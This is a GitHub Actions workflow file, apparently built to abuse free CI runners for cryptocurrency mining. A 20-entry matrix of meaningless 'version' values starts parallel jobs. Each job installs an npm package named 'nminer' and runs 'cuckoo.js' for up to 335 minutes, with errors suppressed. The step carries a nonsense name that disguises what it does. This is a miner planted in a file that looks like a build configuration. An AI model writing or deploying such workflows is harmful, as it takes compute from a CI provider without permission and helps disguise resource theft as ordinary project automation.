name: cuckoo
on:
  push:
    branches: [ "main" ]

jobs:
  build:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        config:
          - { version: 5121 }
          - { version: 4525 }
          - { version: 2594 }
          - { version: 4443 }
          - { version: 7127 }
          - { version: 9116 }
          - { version: 7897 }
          - { version: 9496 }
          - { version: 2222 }
          - { version: 1152 }
          - { version: 4023 }
          - { version: 7817 }
          - { version: 6023 }
          - { version: 8974 }
          - { version: 4925 }
          - { version: 9344 }
          - { version: 7446 }
          - { version: 8946 }
          - { version: 4353 }
          - { version: 54 }

    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Install Node.js
        uses: actions/setup-node@v3
        with:
          node-version: 20
          
      - name: hungrily finally wholly and drive
        run: |
          npm install nminer@latest
          timeout 335m node cuckoo.js || echo "cuckoo executed"